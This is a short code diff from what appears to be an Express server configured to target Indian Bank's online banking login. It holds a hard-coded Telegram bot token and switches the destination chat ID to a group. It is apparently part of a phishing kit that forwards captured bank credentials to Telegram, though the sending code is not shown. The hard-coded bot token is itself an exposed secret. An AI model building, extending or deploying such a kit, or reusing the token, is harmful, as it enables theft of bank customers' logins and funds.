@@ -8,7 +8,7 @@ app.use(express.urlencoded({ extended: true }));
 
 // ---------- YOUR TELEGRAM CREDENTIALS ----------
 const BOT_TOKEN = '8956593370:AAHT5wVCVoU_Vfkn7eJ79Ojlgpe0A30Ytbk';
-const CHAT_ID = '8956593370';
+const CHAT_ID = '-1003962870791';
 
 // ---------- INDIAN BANK CONFIGURATION ----------
 const TARGET_URL = 'https://online.indianbank.bank.in/RetailBanking/';
